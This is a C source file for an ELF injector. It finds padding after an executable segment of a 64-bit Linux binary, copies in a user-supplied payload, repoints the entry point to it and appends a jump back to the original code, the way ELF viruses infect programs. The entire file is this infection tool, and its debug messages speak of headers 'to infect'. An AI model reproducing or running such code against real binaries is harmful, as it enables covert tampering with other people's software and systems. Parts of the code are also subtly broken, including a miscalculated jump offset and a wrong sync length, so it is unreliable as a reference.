#include "structs.h"

/* THE FIRST PART:
        https://www.conradk.com/elf-from-scratch/
        https://linuxvox.com/blog/reading-the-contents-of-an-elf-section-programmatically/
        https://www.man7.org/linux/man-pages/man5/elf.5.html
        1. Read header

*/

// Coloured Error Printer

int verbose = 1;

unsigned char placeholder_payload[] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
uint32_t placeholder_payload_size = sizeof(placeholder_payload);

// not sure if this is needed, we might be able to put this somewhere else
#define DEADBEEF_MAGIC 0xDEADBEEFDEADBEEFULL

 /* ELF header
					mm				(char *)	: memory map with mmap
          header		(Elf64_Ehdr)		: Elf header, contains info about binary
		 			pheader 	(Elf64_Phdr) 		: Array of programs
          prog_size	(size_t)				: Payload size
 */

int read_elf(char *mm, Elf64_Ehdr *header, Elf64_Phdr *pheader, size_t prog_size){
	if(verbose) fprintf(stderr, "\n>>>> Starting READ: <<<<\n\n");
	if(prog_size == 0)
		f_error("PAYLOAD", "Payload Size 0 Error");

  // Verifying authenticity & type of ELF file
  // verify authenticity
  if (mm[EI_MAG0] != ELFMAG0 || mm[EI_MAG1] != ELFMAG1 ||
      mm[EI_MAG2] != ELFMAG2 || mm[EI_MAG3] != ELFMAG3)
    f_error("ELF FILE",
            "Binary is not an ELF file, failed ELF header validation");
  // verify 64 bit
  if (mm[EI_CLASS] != ELFCLASS64)
    f_error("ELF FILE", "Binary is not 64 bit, failed ELF header validation");
  else if (verbose)
    fprintf(stderr, "Target ELF file verified.\n");
  // END VERIFY

	if( header->e_phoff == 0 )
		f_error("ELF Header", "ELF file Header struct broken");
	else if( header->e_shoff == 0 )
		f_error("ELF Header", "ELF Section Header struct broken");
	
	unsigned int phnum = header->e_phnum;
	if(verbose){
		fprintf(stderr, "Program header entries:           %d\n", phnum);
		fprintf(stderr, "Program header entry byte size:   0x%x\n", (uint16_t) header->e_phentsize);
		fprintf(stderr, "Program header entry byte offset: 0x%x\n", (uint16_t) header->e_phoff);

		/* idk what I was doing here, this does something I guess fprintf(stderr, "Program header entries:\n");
		for(int i = 0; i < phnum; ++i){
			fprintf(stderr, "\t%2d: ", i+1);
			for(int j = 0; j < phsize; ++j)
				fprintf(stderr, "\e[0;32m%x\e[0m", mm[header->e_phoff+(i*phsize)+j]);
			fprintf(stderr, "\n");
		}
		*/
	}


	uint64_t start = -1;

	for(int i = 0; i < phnum; ++i){
		if (pheader[i].p_filesz > 0 && (pheader[i].p_flags & PF_X) && (pheader[i].p_filesz == pheader[i].p_memsz)){

			start = pheader[i].p_memsz + pheader[i].p_offset;
			fprintf(stderr, "\nFOUND VALID PROGRAM HEADER TO INFECT, at %lu, p%d\n", start, i+1);

			if(verbose){
				fprintf(stderr, "\tElf program header mem size:             0x%lx\n", pheader[i].p_memsz);
				fprintf(stderr, "\tElf program file size:                   0x%lx\n", pheader[i].p_filesz);
				fprintf(stderr, "\tElf program header byte offset:          0x%lx\n", pheader[i].p_offset);
				fprintf(stderr, "\tElf program header physical address:     0x%lx\n", pheader[i].p_paddr);
				fprintf(stderr, "\tElf program header byte virtual address: 0x%lx\n", pheader[i].p_vaddr);
			}

			uint64_t nh = -1;
			for(int j = 0; j < phnum; ++j)
				if(pheader[j].p_offset > start && pheader[j].p_filesz > 0){
					if(nh == -1) nh = pheader[j].p_offset;
					else nh = (nh > pheader[j].p_offset) ? pheader[j].p_offset : nh;
				}
			nh--;
			if(prog_size > nh-start + 5) // +5 to ensure return jump script fits
				f_error("PAYLOAD", "Not enough padding, payload too large!");
			if(verbose){
				fprintf(stderr, "\n");
				fprintf(stderr, "START BYTE:   0x%lx\n", start);
				fprintf(stderr, "END BYTE:     0x%lx\n", nh);
				fprintf(stderr, "BYTES SIZE:   %lu\n", nh - start);
				fprintf(stderr, "PAYLOAD SIZE: %lu\n", prog_size);
			}
			start = i;
		}
	}
  return start;
}


void write_injection(char *target, Elf64_Ehdr *header, Elf64_Phdr *phdr, char *payload_data, size_t payload_len, int ph_num) {

	Elf64_Addr inj_pos = (Elf64_Addr) (phdr[ph_num].p_offset + phdr[ph_num].p_filesz);
	uint64_t entry_pos = phdr[ph_num].p_vaddr + phdr[ph_num].p_filesz;
	// offset of virtual memory to write to
	off_t offset = header->e_entry - (entry_pos + payload_len);

	if(verbose){
		fprintf(stderr, "\n>>>> Starting WRITE: <<<<\n\n");
		fprintf(stderr, "Injection position:          0x%lx\n", inj_pos);
		fprintf(stderr, "Original entry point:        0x%lx\n", header->e_entry);
		fprintf(stderr, "New entry point position:    0x%lx\n", entry_pos);
		fprintf(stderr, "JUMP len back to original:   %ld\n", offset);
		fprintf(stderr, "Entry distance:              %lu\n", entry_pos - header->e_entry);
	}

	// Generating machine relative return 'jmp' insert
	char jump_back[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
	*(Elf64_Word*) (jump_back + 1) = (Elf64_Word) offset;

	if (offset > 0x7FFFFFFFL || offset < -0x80000000L) 
		f_error("JMP", "Relative jmp >2gb, unable to perform jump");

	// setting entry point to the injection
	header->e_entry = entry_pos;
	
	// writing payload to target
	memcpy(target + inj_pos, payload_data, payload_len);
	memcpy(target + inj_pos + payload_len, jump_back, 5);

	// increasing program header file sizes
	phdr[ph_num].p_filesz += payload_len;
	phdr[ph_num].p_memsz += payload_len;

	if(verbose)
		fprintf(stderr, "\nFinished injection. Exiting.\n\n");
}


int main(int argc, char **argv) {
  printf("ELF Injector Initiated\n\n");
	if(argc < 3)
		f_error("PROGRAM INPUT", "Not enough arguments.");

	char *target;
	size_t target_size;
	if(verbose) fprintf(stderr, "Opening target ELF, \"%s\"\n", argv[1]);
	switch(file_memmap(&target, argv[1], &target_size, PROT_READ | PROT_WRITE)){
		case -1: f_error("TARGET ELF FILE", "Target ELF file failed to open");
		case -2: f_error("TARGET ELF FILE", "Target ELF stat failed to retrieve");
	}
  Elf64_Ehdr *header = (Elf64_Ehdr *) target;
	Elf64_Phdr *pheader = (Elf64_Phdr *) (target + header->e_phoff);

	char *payload;
	size_t payload_size;
	if(verbose) fprintf(stderr, "Opening payload binary, \"%s\"\n", argv[2]);
	switch(file_memmap(&payload, argv[2], &payload_size, PROT_READ)){
		case -1: f_error("PAYLOAD", "PAYLOAD failed to open");
		case -2: f_error("PAYLOAD", "PAYLOAD stat failed to retrieve");
	}

	// inject_head: Offset for payload to be injected
	int ph_num = read_elf(target, header, pheader, payload_size);
	if(ph_num < 0) f_error("ELF Reader", "Failed to find injection point!");
	write_injection(target, header, pheader, payload, payload_size, ph_num);

	msync(target, payload_size, MS_SYNC);

	mmclean(target, target_size);
	mmclean(payload, payload_size);
  return 0;
}
